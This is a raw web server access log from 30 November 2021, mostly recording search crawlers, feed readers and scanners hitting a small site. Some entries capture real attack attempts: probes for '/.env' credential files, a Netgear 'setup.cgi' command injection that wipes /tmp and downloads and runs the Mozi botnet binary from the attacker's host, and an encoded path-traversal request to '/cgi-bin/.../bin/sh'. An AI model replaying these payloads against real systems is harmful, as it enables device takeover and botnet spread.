157.55.39.27 - - [30/Nov/2021:07:52:29 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
209.153.66.66 - - [30/Nov/2021:07:56:05 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Tiny Tiny RSS/21.11-df7b2e7 (https://tt-rss.org/)"
185.174.28.82 - - [30/Nov/2021:07:58:05 +0000] "GET /.env HTTP/1.1" 301 231 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.174.28.82 - - [30/Nov/2021:07:58:06 +0000] "POST /.env HTTP/1.1" 301 231 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.146.164.110 - - [30/Nov/2021:08:04:01 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
40.77.167.1 - - [30/Nov/2021:08:27:23 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
172.104.217.53 - - [30/Nov/2021:08:41:18 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
45.143.99.69 - - [30/Nov/2021:08:48:50 +0000] "GET / HTTP/1.1" 301 230 "-" "Go-http-client/1.1"
46.98.194.22 - - [30/Nov/2021:08:51:23 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
209.153.66.66 - - [30/Nov/2021:08:51:35 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Tiny Tiny RSS/21.11-df7b2e7 (https://tt-rss.org/)"
27.45.14.154 - - [30/Nov/2021:08:52:16 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://27.45.14.154:35965/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 301 400 "-" "-"
207.46.13.126 - - [30/Nov/2021:09:39:01 +0000] "GET / HTTP/1.1" 301 228 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
97.107.141.188 - - [30/Nov/2021:09:41:17 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
216.244.66.232 - - [30/Nov/2021:09:41:27 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
209.153.66.66 - - [30/Nov/2021:09:44:18 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Tiny Tiny RSS/21.11-df7b2e7 (https://tt-rss.org/)"
192.3.176.142 - - [30/Nov/2021:09:48:33 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 zgrab/0.x"
27.115.124.109 - - [30/Nov/2021:09:51:39 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; EML-AL00 Build/HUAWEIEML-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 baidu.sogo.uc.UCBrowser/11.9.4.974 UWS/2.13.1.48 Mobile Safari/537.36 AliApp(DingTalk/4.5.11) com.alibaba.android.rimet/10487439 Channel/227200 language/zh-CN"
27.115.124.101 - - [30/Nov/2021:09:51:49 +0000] "GET / HTTP/1.1" 301 227 "http://baidu.com/" "Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; EML-AL00 Build/HUAWEIEML-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 baidu.sogo.uc.UCBrowser/11.9.4.974 UWS/2.13.1.48 Mobile Safari/537.36 AliApp(DingTalk/4.5.11) com.alibaba.android.rimet/10487439 Channel/227200 language/zh-CN"
47.252.38.12 - - [30/Nov/2021:09:53:08 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 226 "-" "curl/192.15"
